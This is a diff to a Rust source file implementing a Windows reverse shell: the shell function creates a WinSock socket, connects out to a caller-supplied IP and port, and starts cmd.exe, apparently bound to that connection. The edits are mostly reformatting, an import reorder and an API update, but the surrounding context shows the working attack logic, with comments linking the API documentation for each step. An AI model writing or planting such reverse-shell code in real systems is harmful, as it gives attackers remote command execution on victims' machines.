@@ -1,6 +1,6 @@
 use core::ffi::c_void;
-use std::mem;
 use std::ffi::CStr;
+use std::mem;
 use windows::core::{PCSTR, PSTR};
 use windows::Win32::Foundation::HANDLE;
 use windows::Win32::Networking::WinSock::{
@@ -29,16 +29,7 @@ pub fn shell(ip: &str, port: u16) {
     // Call WSASocket to create a socket
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinSock/fn.WSASocketA.html
-    let socket = unsafe {
-        WSASocketA(
-            AF_INET.0.into(),
-            SOCK_STREAM.0,
-            IPPROTO_TCP.0,
-            None,
-            0,
-            0,
-        )
-    };
+    let socket = unsafe { WSASocketA(AF_INET.0 as i32, SOCK_STREAM.0, IPPROTO_TCP.0, None, 0, 0) };
 
     // Call inet_pton to populate the sockaddr_in.sin_addr field, which is needed as part of the socket connection
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-inet_pton
@@ -65,7 +56,13 @@ pub fn shell(ip: &str, port: u16) {
     // Connect the socket!
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinSock/fn.connect.html
-    let connection_result = unsafe { connect(socket, &sockaddr_in as *const SOCKADDR_IN as *const SOCKADDR, mem::size_of::<SOCKADDR_IN>() as _) };
+    let connection_result = unsafe {
+        connect(
+            socket,
+            &sockaddr_in as *const SOCKADDR_IN as *const SOCKADDR,
+            mem::size_of::<SOCKADDR_IN>() as _,
+        )
+    };
     if connection_result != 0 {
         panic!("Unable to call connect to the remote socket")
     }
@@ -106,7 +103,7 @@ pub fn shell(ip: &str, port: u16) {
             &mut PROCESS_INFORMATION::default(),
         )
     };
-    if !create_res.as_bool() {
+    if create_res.is_err() {
         panic!("Could not start cmd.exe process");
     }
 }
